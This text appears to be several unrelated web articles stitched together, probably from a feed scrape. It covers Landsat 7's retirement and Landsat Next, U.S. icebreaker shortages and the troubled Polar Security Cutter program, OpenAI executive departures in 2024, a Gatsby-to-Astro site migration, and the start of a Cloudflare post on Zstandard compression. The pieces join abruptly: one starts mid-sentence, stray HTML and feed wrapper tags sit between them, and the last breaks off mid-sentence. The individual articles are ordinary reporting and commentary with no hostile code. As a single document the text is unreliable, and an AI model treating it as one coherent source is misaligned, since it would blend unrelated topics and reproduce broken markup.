<p>To allow Landsat 9, launched in September 2021, to share the same orbital position as Landsat 8, the USGS lowered Landsat 7’s orbit. Even at its lower altitude, Landsat 7 continued to collect valuable data. However, being lowered caused Landsat 7 to increasingly drift within its orbit. The drift exposed it to periods of full sunlight and earlier imaging times, impacting battery maintenance, imaging opportunities, and processing of reliable science data. As a result, the USGS decided to end imaging from the aging satellite.&nbsp;</p>

<p>Today, Landsat operates with two satellites, Landsats 8 and 9, that work together to compile a complete set of Earth land images every 8 days.</p>

<p><strong>The Landsat Mission Continues</strong></p>
<p>With the end of Landsat 7’s role in the Landsat science mission and the advancing age of Landsat 8, launched in 2013, attention is now directed toward the Landsat Next mission as a critical next step to ensure continuity of Landsat’s unique global Earth science mission. The USGS is currently focused on ensuring the flow of data remains uninterrupted and that the quality of information keeps pace with evolving technological and environmental demands.</p>

<p>The newest mission, known as Landsat Next, promises enhanced capabilities over its predecessors, including improved spatial resolution, increased spectral bands, and faster revisit times. These advancements are essential for more detailed and frequent monitoring of Earth's changing landscapes and for supporting critical decisions in climate resiliency, disaster response, agriculture and water management.&nbsp;</p>
<figure role="group">
  <div>
    
  

    <figcaption>Landsat Next satellites circling the Earth. The mission is planned for late 2030/early 2031.</figcaption>
  </div>
</figure>
<p>Landsat Next is designed not only to continue the legacy of Landsat, but also to innovate and adapt to the pressing challenges of the 21st century, ensuring that scientists, policymakers, industry, and the public have access to the information needed to better monitor and sustainably manage our ever-changing planet.</p>

In 2014, Xi Jinping stated that China planned on joining the ranks of “the great polar powers,” and in 2023 Russia and China sent a naval force to </span><a href="https://archive.ph/OGdzP" rel="">patrol near the coast of Alaska</a><span>. By shipping goods through shorter, previously inaccessible Arctic Ocean routes, China could potentially reduce its ocean-based transportation costs by 40%, saving hundreds of billions of dollars per year.</span></p><p><span>Because polar bodies of water are often covered in ice, accessing these regions by ship requires specially designed ships which can break up the ice and create a path for other ships to follow. The need for icebreaking vessels will remain even as climate change reduces the extent of sea ice: paradoxically, as new polar routes become accessible and sea ice becomes more mobile, the demand for icebreakers is likely to increase. Russia has an aging fleet of more than </span><a href="https://www.ponarseurasia.org/russias-icebreakers-north-sea-route-and-invasion-of-ukraine/" rel="">40 icebreakers</a><span>, with several under construction. China has somewhere between 5 and 7 </span><a href="https://en.wikipedia.org/wiki/List_of_icebreakers#China" rel="">icebreakers</a><span> (depending on exactly how you define “icebreaker”), with more </span><a href="https://maritime-executive.com/article/china-unveils-its-fourth-research-icebreaker" rel="">under construction</a><span>.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-149401395" href="https://www.construction-physics.com/p/why-the-us-cant-build-icebreaking#footnote-1-149401395" target="_self" rel="">1</a></span></p><p><span>The U.S., on the other hand, has allowed its icebreaking capabilities to wither. The Coast Guard has handled all U.S. icebreaking since 1966, and estimates that it needs 8-9 polar icebreakers (4-5 heavy and 4-5 medium) to fulfill its needs. But it currently has only two: the heavy icebreaker </span><em><a href="https://en.wikipedia.org/wiki/USCGC_Polar_Star" rel="">Polar Star</a></em><span>, and the medium icebreaker </span><em><a href="https://en.wikipedia.org/wiki/USCGC_Healy" rel="">Healy</a></em><span>. The U.S. hasn’t built a heavy icebreaker </span><a href="https://sixtydegreesnorth.substack.com/p/uscgs-polar-icebreaker-program-if" rel="">since 1976</a><span>. In fact, </span><a href="https://www.cbo.gov/system/files/2024-08/60170-Polar-Security-Cutter.pdf" rel="">no existing U.S. shipyard</a><span> has built a heavy polar icebreaker since before 1970. A </span><a href="https://nap.nationalacademies.org/catalog/24834/acquisition-and-operation-of-polar-icebreakers-fulfilling-the-nations-needs" rel="">2017 National Academies</a><span> report stated that “The nation is ill-equipped to protect its interests and maintain leadership in these regions and has fallen behind other Arctic nations, which have mobilized to expand their access to ice-covered regions.”</span></p><p><span>And while the U.S. is trying to remedy this with a </span><a href="https://www.cbo.gov/system/files/2024-08/60170-Polar-Security-Cutter.pdf" rel="">Polar Security Cutter program</a><span> to build a series of new heavy polar icebreakers (to be followed by a series of medium icebreakers), the program is going poorly. When the contract was first awarded in 2019, the plan was to have the first icebreaker </span><a href="https://sixtydegreesnorth.substack.com/p/uscgs-polar-icebreaker-program-if" rel="">completed by 2024</a><span>. But as of July this year, the design of the </span><a href="https://sixtydegreesnorth.substack.com/p/us-coast-guard-icebreaker-update" rel="">ship was still incomplete</a><span>. If and when the ships are completed (currently 2029 for the first vessel at the earliest), they are expected to cost $1.7-1.9 </span><a href="https://www.cbo.gov/system/files/2024-08/60170-Polar-Security-Cutter.pdf" rel="">billion apiece</a><span>, roughly four to five times what a comparable ship would cost to </span><a href="https://sixtydegreesnorth.substack.com/p/the-silicon-valley-of-icebreaking" rel="">build</a><span> elsewhere. Icebreakers, then, are another unfortunate example of the costs inflicted by binding national interests to an inefficient shipbuilding industry.</span></p><p><span>An icebreaker is exactly what it sounds like; a ship designed to break up ice, either to create a passage for itself or to create a channel for other ships to follow. A ship might be designed primarily for icebreaking (like the </span><em><a href="https://en.wikipedia.org/wiki/USCGC_Polar_Star" rel="">Polar Star</a></em><span>) or designed for icebreaking and other duties. The French </span><em><a href="https://sixtydegreesnorth.substack.com/p/a-successful-commercial-icebreaker" rel="">Le Commandant Charcot</a></em><span> is a cruise ship with icebreaking capabilities. Modern icebreakers </span><a href="https://en.wikipedia.org/wiki/Polar_Class" rel="">are rated</a><span> based on their ability to break through ice and operate in various ice conditions. Higher-rated icebreakers can continuously break through ice nearly 10 feet thick, and can ram through even thicker ice.</span></p><p><span>Breaking ice requires a host of specific design features. Traditional icebreakers pair high-powered engines with specially shaped hulls designed to create downward pressure over the top of the ice, breaking it apart under high tensile forces, as ice is weak in tension. For particularly thick ice, or ice ridges, the entire front of the icebreaker may be driven up onto the ice, breaking the ice beneath it. The hull and ship structure must be strong enough to withstand the impact of ice, and a heavily reinforced “</span><a href="https://www.marineinsight.com/naval-architecture/design-and-construction-of-ice-class-ships-part-2/" rel="">ice-belt</a><span>,” often made of special high-strength steel, is installed near the level of the waterline. Things like </span><a href="https://nrc.canada.ca/en/stories/breaking-ice-ease" rel="">air bubbler systems</a><span> (which blow bubbles of air up around the ship from beneath the water) and </span><a href="https://www.international-marine.com/en/products/intershield-163-inerta-160" rel="">low-friction paint</a><span> reduce friction as the ship forces its way through the ice. Traditional icebreaking hull shapes, while well suited to breaking through ice, perform poorly in open ocean operations; the </span><em>Polar Star</em><span> has been dubbed “</span><a href="https://www.kqed.org/science/23053/life-aboard-a-polar-roller-americas-last-heavy-icebreaker" rel="">The Polar Roller</a><span>” due to its tendency to roll constantly.</span></p><p><span>The development of rotatable “azimuth” thrusters in the late 1980s, sometimes known as </span><a href="https://en.wikipedia.org/wiki/Azipod" rel="">azipods</a><span>, changed the mechanics of icebreaking. Icebreaking ships with azimuth thrusters are often designed to break ice by moving backwards, using the propellers to break ice from below and to flush the hull with water to reduce friction. Not only does this reduce the power required to break ice, but it allows for the front (bow) of the ship to be designed for better open water performance. </span><a href="https://en.wikipedia.org/wiki/Baltika_(icebreaker)" rel="">Some modern icebreakers</a><span> are designed to use azimuth thrusters to move forward at an oblique angle to create an especially wide channel.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png" width="600" height="399" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:399,&quot;width&quot;:600,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Azimuth thrusters.</figcaption></figure></div><p><span>The specialized design requirements and equipment make icebreaker ship design and construction a specialized field of expertise.

During a major refurbishment of the </span><em>Polar Star</em><span> in 2010, the head of the Coast Guard stated that “it’s a little uncertain to me how many more years we can get out of her in her current condition.” That was 14 years ago; today the </span><em>Polar Star</em><span> remains America’s only heavy icebreaker, and the only U.S. ship that can clear a path through the ice to resupply McMurdo Station.</span></p><p><span>To replace its aging icebreakers with a new, larger fleet of ships, in 2013 the Coast Guard initiated its </span><a href="https://en.wikipedia.org/wiki/Polar_Security_Cutter_program" rel="">Polar Security Cutter program</a><span> to construct a series of new heavy icebreakers. The Coast Guard solicited bids in 2017, and the first contract was awarded in 2019, to VT Halter Marine, with an expected delivery date of 2024 for the first ship. But the program has gone poorly. While most icebreakers are custom designed using proven concepts, the team of </span><a href="https://navalarchitects.us/" rel="">TAI</a><span> and Halter Marine used a German icebreaker that has yet to be built as a ‘parent design’, intending to modify it for Coast Guard needs. After five years, this modification still isn’t complete; as of July 2024 the design was only 59% done, and construction has not yet started. While the original delivery date for the first ship was 2024, that has now been pushed back to 2029.</span></p><p><span>In a report and testimony, the GAO </span><a href="https://sixtydegreesnorth.substack.com/p/uscgs-polar-icebreaker-program-if" rel="">described</a><span> some of the problems during the program:</span></p><ul><li><p><em>U.S.-based designers and shipbuilders generally lacked experience designing and building heavy polar icebreakers.</em></p></li><li><p><em>The ship design is complex, including that it used a specialized steel alloy that required technical study and development of new welding procedures before use.</em></p></li><li><p><em>The shipbuilder overestimated the extent to which it could leverage the original design and had to make significant design changes to meet government specifications, according to program officials. The shipbuilder also made some design errors, such as selecting the wrong height for the lowest deck of the ship, which required significant, late redesign to correct.</em></p></li><li><p><em>COVID-19 restrictions limited the extent to which the shipbuilder could collaborate and consult with its domestic and international partners.</em></p></li></ul><p><span>Notably, VT Halter Marine lost $256 million between 2017 and 2021, after which it was bought for a song (just $15 million) by </span><a href="https://news.usni.org/2022/11/14/bollinger-closes-15m-acquisition-of-halter-marine-new-name-bollinger-mississippi-shipbuilding" rel="">Bollinger</a><span>, which took over the icebreaker contracts.</span></p><p><span>Originally, the Polar Security Cutters were expected to cost $800-$900 million per ship ($1.1-$1.3 billion in 2024 dollars), but current cost estimates are closer to $1.7-1.9 billion, and given that construction hasn’t started yet, this is likely to rise. And it’s unclear if that 2029 date will be hit either. The </span><a href="https://www.gao.gov/assets/gao-23-105949.pdf" rel="">GAO report</a><span> notes that “the shipyard is completing, on average, approximately three percent of functional design and six percent of transitional design every six months. At that design completion rate, it would take the shipyard approximately eight years to complete functional design.”</span></p><p><span>By contrast, a Finnish shipyard can build a heavy icebreaker for just a few hundred million dollars, and deliver it within two years, instead of 10 or more. However, the Coast Guard opted not to pursue a foreign manufacturer, instead choosing a U.S. shipyard. The culprit here isn’t the Jones Act, but another protectionist shipbuilding law that requires Naval and Coast Guard ships to be built in U.S. shipyards. It’s possible to waive this requirement via </span><a href="https://sixtydegreesnorth.substack.com/p/yes-the-us-coast-guard-can-build" rel="">presidential authorization</a><span>, but there hasn’t appeared to be much interest in this. Waiving this requirement and allowing the Coast Guard to buy icebreakers from Finland would likely save over a billion dollars per ship, as well as years of construction time.</span></p><p><span>Barring acquiring Finnish icebreakers, the next best option for the U.S. icebreaker program would have been awarding the contract to a team that had icebreaker experience. Finnish shipbuilding firms previously assisted during the design and construction of the </span><em><a href="https://sixtydegreesnorth.substack.com/p/the-silicon-valley-of-icebreaking" rel="">Healy</a></em><span>. Of the three bids submitted for the Polar Security Cutter program, two were from U.S. shipyards partnered with European firms that had previously designed and built icebreakers. The winning bid from VT Halter was, bizarrely, the </span><a href="https://sixtydegreesnorth.substack.com/p/uscgs-polar-icebreaker-program-if" rel="">only bid without an experienced partner</a><span>.</span></p><p><span>The U.S. has made some gestures to try and improve its icebreaker construction with the </span><a href="https://www.whitehouse.gov/briefing-room/statements-releases/2024/07/11/biden-harris-administration-announces-new-polar-partnership-ice-pact-alongside-finland-and-canada/" rel="">ICE Pact</a><span>, a non-binding agreement to collaborate and share information on icebreaker design and construction. But experts </span><a href="https://sixtydegreesnorth.substack.com/p/ice-pact-update" rel="">appear skeptical</a><span> as to whether this will have much impact, as it’s predicated on attracting foreign orders for U.S.-built icebreakers that aren’t likely to materialize.</span></p><p><span>With icebreakers, we see a microcosm of </span><a href="https://www.construction-physics.com/p/why-cant-the-us-build-ships" rel="">the broader problems we looked at</a><span> in U.S. shipbuilding. Icebreakers are far more expensive to build (and take much longer to build) in the U.S. than in foreign shipyards, and it’s only a series of protectionist laws that drive any icebreaker construction here at all.&nbsp;</span></p><p><span>We also see the same cultural issues that we saw with American shipbuilding more broadly. There seems to be a lack of motivation to take maritime issues seriously or treat them as important. For decades, the U.S. has been willing to accept an undersized icebreaker fleet – complaints about insufficient icebreakers </span><a href="https://nap.nationalacademies.org/catalog/11753/polar-icebreakers-in-a-changing-world-an-assessment-of-us" rel="">date back to the 1980s</a><span>. There appears to be little interest in trying to ameliorate this by acquiring foreign icebreakers, even though that would be comparatively simple, far cheaper, and far faster. And the Coast Guard apparently did not think icebreakers were important enough to select a team for building them that had icebreaker experience, even though it’s a niche, specialized area of marine construction.</span></p><p><span>As a result, icebreaking can be added to the list of things like </span><a href="https://reason.org/commentary/the-foreign-dredge-act-increases-costs-and-slows-the-key-bridge-cleanup/" rel="">dredging</a><span> and </span><a href="https://www.cato.org/blog/jones-act-helps-sink-new-jersey-offshore-wind-project" rel="">offshore wind turbine </a><span>installation: areas that have been shackled to America’s inefficient shipbuilding industry and have inflicted costs on the country in the process.</span></p><p><em><span>Much of this information comes from Peter Rybski’s substack, </span><a href="https://sixtydegreesnorth.substack.com/" rel="">60 Degrees North</a><span>, which I highly recommend if you’re interested in learning more about icebreakers and icebreaker policy. Thanks to Peter for reading a draft of this. All errors are my own.</span></em></p><p><em><span>For those interested in reading more about icebreakers, and about shipbuilding, a recommended reading list is </span><a href="https://open.substack.com/pub/constructionphysics/p/shipbuilding-and-icebreakers-reading?r=23el8&amp;utm_campaign=post&amp;utm_medium=web" rel="">available here</a><span> for paid subscribers.</span></em></p></div></div>]]></description>

<div id="readability-page-1" class="page"><div id="body">
<p>Three key OpenAI staff members – CTO Mira Murati, Chief Research Officer Bob McGrew, and Research VP Barret Zoph – are leaving the ChatGPT maker.</p>
<p>Murati <a target="_blank" rel="nofollow" href="https://x.com/miramurati/status/1839025700009030027/photo/1">described</a> the decision as "difficult," but wrote that "this moment feels right." She said she is leaving "because I want to create the time and space to do my own exploration."</p>
<p>Murati was joined by McGrew, who <a target="_blank" rel="nofollow" href="https://x.com/bobmcgrewai/status/1839099787423134051">said</a>: "It is time for me to take a break." Regarding his departure, Zoph <a target="_blank" rel="nofollow" href="https://x.com/barret_zoph/status/1839095143397515452">stated</a>: "This is a personal decision based on how I want to evolve the next phase of my career."</p>

    

<p>Murati briefly served as OpenAI CEO during the <a target="_blank" href="https://www.theregister.com/2023/11/20/ex_openai_boss_sam_altman_to_join_microsoft/">firing and rehiring</a> of Sam Altman last year.</p>

        


        

<p>Altman <a target="_blank" rel="nofollow" href="https://x.com/sama/status/1839096160168063488">posted</a> a glowing tribute to the departing staffers and called Murati "instrumental to OpenAI's progress and growth the last 6.5 years." The OpenAI boss also insisted that the other departures were entirely coincidental and "decisions made independently of each other."</p>
<p>Jason Wong, Gartner analyst, told <i>The Register</i>: "It's clear with the departures of the co-founders, and high-profile engineering leaders, that OpenAI is being remade with Sam's vision. His manifesto and the shift to a for-profit entity also reinforces his vision for the business.</p>

        

<p>"This could have significant impact on OpenAI's partnership with Microsoft, which clearly stated they view OpenAI as a competitor. Microsoft has already started to downplay the importance of OpenAI models in their overall AI strategy. For enterprises, uncertainty is not good for business and key tech investments like generative AI. Other frontier models – especially more open ones – have caught up to OpenAI, which will further influence decisions to derisk by moving away from OpenAI or spread their risk using other models."</p>
<p>AI expert Dr Gary Marcus <a target="_blank" rel="nofollow" href="https://garymarcus.substack.com/p/openais-slow-motion-train-wreck">described</a> the events at OpenAI as a "slow-motion train wreck."</p>
<p>OpenAI co-founder Ilya Sutskever <a target="_blank" href="https://www.theregister.com/2024/05/15/openai_cofounder_ilya_sutskever_leaves/">quit earlier this year</a>. Another co-founder, Greg Brockman, <a target="_blank" rel="nofollow" href="https://x.com/gdb/status/1820644694264791459">announced</a> he would be taking a sabbatical until the end of the year, and now Murati is leaving.</p>
<ul>

<li><a href="https://www.theregister.com/2024/09/26/openai_training_data_author_copyright_case/">OpenAI to reveal secret training data in copyright case – for lawyers' eyes only</a></li>

<li><a href="https://www.theregister.com/2024/09/25/altman_5gw_dc/">Altman reportedly asks Biden to back a slew of multi-gigawatt-scale AI datacenters</a></li>

<li><a href="https://www.theregister.com/2024/09/13/openai_rolls_out_reasoning_o1/">OpenAI's latest o1 model family tries to emulate 'reasoning' – tho might overthink things a bit</a></li>

<li><a href="https://www.theregister.com/2024/09/05/ssi_funding/">OpenAI co-founder's Safe Superintelligence startup inhales $1B in funding</a></li>
</ul>
<p>It's almost as if a person had asked ChatGPT to write a soap opera set in an absurdly overvalued AI company.</p>
<p>Murati's departure comes alongside <a target="_blank" rel="nofollow" href="https://www.reuters.com/technology/artificial-intelligence/openai-remove-non-profit-control-give-sam-altman-equity-sources-say-2024-09-25/">a Reuters report</a> citing sources saying OpenAI is working on a plan that will take control away from its non-profit board and instead restructure the business as a for-profit corporation.</p>

        

<p>Such a move could lead to Altman receiving equity in the for-profit company, making the timing of Murati's departure even more interesting. Other <a target="_blank" rel="nofollow" href="https://www.bloomberg.com/news/articles/2024-09-11/openai-fundraising-set-to-vault-startup-s-value-to-150-billion">reports</a> earlier in September put OpenAI's value at $150 billion as part of an impending funding round. Quite a jump from the <a target="_blank" href="https://www.theregister.com/2023/09/26/openai_90bn_valuation/">$90 billion figure</a> thrown around a year ago.</p>
<p>Marcus wrote: "GPT-5 hasn't dropped, Sora hasn't shipped, the company had an operating loss of $5 billion last year, there is no obvious moat, Meta is giving away similar software for free, many lawsuits pending.</p>
<p>"Yet people are valuing this company at $150 billion dollars.</p>
<p>"Absolutely insane. Investors shouldn't be pouring more money at higher valuations, they should be asking what is going on."</p>
<p>When we asked OpenAI for comment, it had nothing to add about the departures specifically, with a spokesperson saying: "We remain focused on building AI that benefits everyone and as we've previously shared we're working with our board to ensure that we're best positioned to succeed in our mission. The nonprofit is core to our mission and will continue to exist."</p>
<p>It didn't mention whether the non-profit would actually have control, however. ®</p>

            <description><![CDATA[<p>URL: <a href="https://jwn.gr/posts/migrating-from-gatsby-to-astro/">https://jwn.gr/posts/migrating-from-gatsby-to-astro/</a>, See on <a href="https://news.ycombinator.com/item?id=41661159">Hacker News</a></p>
<div id="readability-page-1" class="page"><div> <p>The lifecycle of a developer’s personal website is a reflection of the ever-evolving landscape of web technologies. Mine is no exception, having gone from humble HTML and CSS beginnings through Create React App and eventually landing on Gatsby. However, Gatsby has shown its age and I found myself seeking a modern alternative. Enter Astro – a framework that has breathed some new life into this site.</p>
<h2 id="catalysts-for-change">Catalysts for change</h2>
<p>My decision to redesign wasn’t just about using a new framework. I had specific goals in mind:</p>
<ol>
<li><strong>Create a dedicated writing space:</strong> I wanted a platform fully under my control for showcasing my ideas.</li>
<li><strong>Reduce maintenance overhead:</strong> My Gatsby site had become a burden. I couldn’t build the site locally or upgrade dependencies, leaving it outdated since 2019.</li>
<li><strong>Make the design feel more professional:</strong> I wanted a cleaner, simpler look that reflected my growth as a developer and designer.</li>
</ol>
<h2 id="the-transformation">The transformation</h2>
<p>Before diving into the technical details, let’s look at the visual transformation:</p>
<div><h5><b>Old site design</b></h5><h5><b>New site design</b></h5><p><img src="https://jwn.gr/_astro/oldSiteThumbnail.CY6fPQMd_Z4m8PN.webp" alt="Old site design" width="600" height="1344" loading="lazy" decoding="async"><img src="https://jwn.gr/_astro/newSiteThumbnail.DCivkNZp_ZRWop3.webp" alt="New site design" width="600" height="900" loading="lazy" decoding="async"></p></div>
<p>Key changes include:</p>
<ul>
<li>New writing section for blog posts, with an RSS feed</li>
<li>Smaller hero section focused on my interests</li>
<li>Updated color scheme and shift to standard browser fonts</li>
<li>Simpler design with fewer images and animations</li>
<li>Updated and accurate work history</li>
</ul>
<h2 id="astros-take-on-static-site-generation">Astro’s take on static site generation</h2>
<p>Beneath the surface, <a href="https://github.com/jwngr/jwn.gr">the codebase</a> underwent a complete
overhaul. Stuck on an outdated Gatsby 1.x version, a full rewrite became the path of least
resistance.</p>
<p>My experience with Gatsby’s older version was fraught with complex data fetching, sluggish
builds, and challenging upgrades. While Gatsby has evolved, Astro emerged as a fresh alternative,
ultimately offering a smoother developer experience and enhanced site performance.</p>
<p>Both Gatsby and Astro are static site generators (SSGs), meaning they generate HTML at build
time which is then shipped to the browser. This is ideal for portfolio and blog sites like mine
which have little dynamic content and want to optimize for search engine indexing.</p>
<p>Where Gatsby and Astro differ is in how they handle rendering and interactivity:</p>
<ul>
<li><strong>Gatsby</strong> generates static HTML at build time, then hydrates into a Single Page Application
(SPA) using React, with navigations being handled in JavaScript.</li>
<li><strong>Astro</strong> is designed as a Multi-Page Application (MPA) by default, shipping minimal
JavaScript and delivering static HTML via full page reloads.</li>
</ul>
<p>Astro delivers faster page loads and better SEO out-of-the-box, while offering flexibility
through <a href="https://docs.astro.build/en/concepts/islands/">Islands</a> for interactivity and optional
server-side rendering. For my primarily static site, Astro’s approach is a perfect fit,
eliminating the unnecessary overhead of a full SPA or React-powered solution.</p>
<h2 id="where-astro-shines">Where Astro shines</h2>
<p>Astro does a lot right. Here’s what stood out to me during the migration:</p>
<ul>
<li><strong>Component-based design:</strong> Astro’s <a href="https://docs.astro.build/en/basics/astro-components/">component architecture</a>
brings one of React’s largest benefits without the dependency. It has some limitations covered
below, but the abstraction feels very familiar.</li>
<li><strong>Simplified data handling:</strong> Astro’s approach to data fetching feels like a return to basics.
No more GraphQL queries everywhere — just straightforward data access using <code>import</code> and <code>await</code>.
<a href="https://docs.astro.build/en/guides/content-collections/">Content collections</a> provide a clean,
type-safe API for my blog with minimal code.</li>
<li><strong>TypeScript support:</strong> Astro’s extensive <a href="https://docs.astro.build/en/guides/typescript/">TypeScript support</a> provides peace of mind and speeds up
development.</li>
<li><strong>Simple, well-designed integrations:</strong> Astro’s <a href="https://docs.astro.build/en/guides/integrations-guide/">integrations</a>
required less code and configuration than I remember from Gatsby. I easily added an RSS feed,
sitemap, and MDX support for the blog.</li>
<li><strong>Framework flexibility:</strong> The ability to fall back to React (or other frameworks) when needed
feels like the right trade-off, avoiding lock-in to Astro’s ecosystem. I leveraged this for my
<a href="https://github.com/jwngr/jwn.gr/blob/master/src/components/blog/NewsletterSignupForm.tsx">newsletter signup form</a>,
which I didn’t have time to migrate from React.</li>
<li><strong>Thoughtful documentation:</strong> The docs are extensive, well-organized, and even include a <a href="https://docs.astro.build/en/guides/migrate-to-astro/from-gatsby/">guide on
migrating from Gatsby</a>.</li>
</ul>
<h2 id="challenges-with-astro">Challenges with Astro</h2>
<p>The migration was not without hurdles:</p>
<ol>
<li><strong>Conditional CSS:</strong> Astro’s approach required rethinking my styling strategy, making some
tasks more tedious compared to using <code>styled-components</code>. Conditionally applying styles using
classes and CSS, even with the help of <code>class:list</code>, required more code than I would like.</li>
<li><strong>Component conversion:</strong> Moving from untyped React class components to <code>.astro</code> components
with TypeScript was time-consuming but ultimately beneficial. I still have some hesitation with the
proprietary file format, but it looks and behaves like TypeScript, JSX, and CSS.</li>
<li><strong>Lack of multiple exports from <code>.astro</code> files:</strong> This limitation led to some code organization
challenges. <code>FlexRow</code> and <code>FlexColumn</code> share a common <a href="https://github.com/jwngr/jwn.gr/blob/master/src/components/atoms/Flex.astro"><code>Flex</code> component</a> that ideally would never be exported. Named exports are important for maintaining large codebases, and I would love to see support for this added to the format.</li>
</ol>
<h2 id="the-results">The results</h2>
<p>While metrics weren’t a primary goal with the redesign, I’m quite happy with the final outcome.
Page loads come in at just a few 100 kB, load within a few 100 ms, and have nearly perfect Lighthouse
scores across the board:</p>
<p><img src="https://jwn.gr/_astro/lighthouse.RnXpFCdL_1nDjv7.webp" alt="Lighthouse scores for jwn.gr" width="796" height="294" loading="lazy" decoding="async"></p><p>More importantly, I achieved my initial goals:</p>
<ol>
<li><strong>Dedicated writing space:</strong> Creating a blog post is now as simple as adding a <code>.mdx</code> file, and
I’m able to fall back to React as needed for more interactive posts.</li>
<li><strong>Reduced maintenance:</strong> Fewer dependencies, less code, and more confidence in future upgrades.</li>
<li><strong>Refreshed appearance:</strong> The new design better represents my current skills and aesthetic
preferences.</li>
</ol>
<h2 id="looking-forward">Looking forward</h2>
<p>My website has gone from a source of frustration to a canvas ready for sharing my work. It is
simultaneously simpler and more capable, which is always what I’m going for.</p>
<p>The best framework is the one that meets your current needs and brings joy to your development
process. Astro is doing that for me right now.</p> </div></div>]]></description>

From being the first to offer free SSL certificates through <a href="https://blog.cloudflare.com/introducing-universal-ssl/"><u>Universal SSL</u></a> to quickly supporting innovations like <a href="https://blog.cloudflare.com/introducing-tls-1-3"><u>TLS 1.3</u></a>, <a href="https://blog.cloudflare.com/introducing-cloudflares-automatic-ipv6-gatewa/"><u>IPv6</u></a>, and <a href="https://blog.cloudflare.com/http-3-from-root-to-tip/"><u>HTTP/3</u></a>, we've consistently made it easy for everyone to harness cutting-edge advancements.</p><p>One of the most exciting recent developments in web performance is Zstandard (zstd) — a new compression algorithm that we have found compresses data 42% faster than Brotli while maintaining almost the same compression levels. Not only that, but Zstandard reduces file sizes by 11.3% compared to GZIP, all while maintaining comparable speeds. As compression speed and efficiency directly impact latency, this is a game changer for improving user experiences across the web.</p><p>We’re also re-starting the <a href="https://blog.cloudflare.com/announcing-encrypted-client-hello/"><u>rollout of Encrypted Client Hello (ECH)</u></a>, a <a href="https://datatracker.ietf.org/doc/draft-ietf-tls-esni/"><u>new proposed standard </u></a>that prevents networks from snooping on which websites a user is visiting. <a href="https://blog.cloudflare.com/encrypted-client-hello/"><u>Encrypted Client Hello (ECH) is a successor to ESNI</u></a> and masks the <a href="https://www.cloudflare.com/en-gb/learning/ssl/what-is-sni/"><u>Server Name Indication (SNI)</u></a> that is used to negotiate a TLS handshake. This means that whenever a user visits a website on Cloudflare that has ECH enabled, no one except for the user, Cloudflare, and the website owner will be able to determine which website was visited. Cloudflare is a big proponent of privacy for everyone and is excited about the prospects of bringing this technology to life.</p><p>In this post, we also further explore our work measuring the impact of HTTP/3 prioritization, and the development of Bottleneck Bandwidth and Round-trip propagation time (BBR) congestion control to further optimize network performance.</p><h2>Introducing Zstandard compression</h2><p><a href="https://github.com/facebook/zstd"><u>Zstandard</u></a>, an advanced compression algorithm, was developed by <a href="https://engineering.fb.com/2018/12/19/core-infra/zstandard/"><u>Yann Collet at Facebook</u></a> and open sourced in August 2016 to manage large-scale data processing.&nbsp; It has gained popularity in recent years due to its impressive compression ratios and speed. The protocol was included in <a href="https://chromestatus.com/feature/6186023867908096"><u>Chromium-based browsers</u></a> and <a href="https://connect.mozilla.org/t5/ideas/add-support-for-zstd-compression/idi-p/52155"><u>Firefox</u></a> in March 2024 as a <a href="https://caniuse.com/zstd"><u>supported</u></a> compression 